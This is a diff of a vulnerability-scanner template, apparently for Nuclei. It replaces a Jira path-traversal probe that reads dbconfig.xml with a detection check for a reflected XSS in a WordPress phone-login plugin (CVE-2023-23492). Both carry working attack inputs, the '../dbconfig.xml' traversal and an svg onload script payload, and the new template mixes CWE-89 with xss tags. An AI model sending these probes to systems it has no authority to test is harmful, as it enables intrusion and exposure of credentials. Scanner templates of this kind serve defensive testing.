@@ -1,10 +1,53 @@
-name: admin
-request:
-    path: '{{BaseURL}}/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime'
-    method: GET
-    matcherscondition: and
-    matchers:
+id: CVE-2023-23492
+info:
+    name: Login with Phone Number - Cross-Site Scripting
+    author: r3Y3r53
+    severity: high
+    description: |
+        Login with Phone Number, versions < 1.4.2, is affected by an reflected XSS vulnerability in the login-with-phonenumber.php' file in the 'lwp_forgot_password()' function.
+        Note that CVE-2023-23492 incorrectly describes and scores this as SQL injection vulnerability.
+    remediation: ""
+    reference:
+        - https://wordpress.org/plugins/login-with-phone-number/
+        - https://www.tenable.com/security/research/tra-2023-3
+        - https://nvd.nist.gov/vuln/detail/CVE-2023-23492
+    classification:
+        cvssmetrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+        cvssscore: 8.8
+        cveid: CVE-2023-23492
+        cweid: CWE-89
+    metadata:
+        verified: "true"
+    tags: login-with-phonenumber,wordpress,wp,wp-plugin,xss,tenable,cve,cve2023
+name: ""
+requests:
+    - raw: []
+      cookiereuse: false
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php?action=lwp_forgot_password&ID=<svg%20onload=alert(document.domain)>'
+      matcherscondition: and
+      matchers:
         - type: word
-          part: part
+          part: body
           words:
-            - <jira-database-config>
+            - <svg onload=alert(document.domain)>
+            - message":"Update password
+          dsl: []
+          condition: and
+          status: []
+        - type: word
+          part: header
+          words:
+            - text/html
+          dsl: []
+          condition: ""
+          status: []
+        - type: status
+          part: ""
+          words: []
+          dsl: []
+          condition: ""
+          status:
+            - 200
+workflows: []
